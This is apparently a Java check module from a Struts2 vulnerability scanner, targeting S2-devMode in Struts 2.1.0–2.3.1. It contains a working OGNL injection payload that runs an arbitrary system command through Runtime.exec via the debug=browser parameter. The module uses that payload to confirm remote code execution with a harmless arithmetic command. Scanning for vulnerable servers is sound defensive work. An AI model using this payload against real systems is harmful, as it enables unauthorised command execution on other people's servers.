package struts2scan.payload;

import struts2scan.util.HttpClient;
import struts2scan.util.HttpResult;

import java.io.IOException;
import java.net.URL;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class S2_devMode implements Check {
    public String printInfo(){
        String info = "[+] S2-devMode:影响版本Struts 2.1.0-2.3.1; GET请求发送数据";
        return info+"\n";
    }

    @Override
    public boolean check(URL url) throws Exception {
        return false;
    }


    @Override
    public boolean check(String protocol, String host, int port,String path) throws Exception {



        int number1 = new Random(10000).nextInt(10000);
        int number2 = new Random(10000).nextInt(10000);
        String poc = "(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789&command={cmd}";

        poc = poc.replace("{cmd}","expr%20"+number1+"%20%2B%20"+number2);

        int number = number1 + number2;
        if (path==null){
            path = "/";
        }else if(!path.endsWith("/")){
            path = path+"/";
        }


        String url = protocol + "://" + host + ":" + port + path + "?debug=browser&object=" + poc;

        HttpResult result = HttpClient.get(url);
        Pattern p = Pattern.compile(String.valueOf(number));
        Matcher m = p.matcher(result.getData());

        if (m.find()) {
            return true;
        } else {
            return false;
        }



    }

}
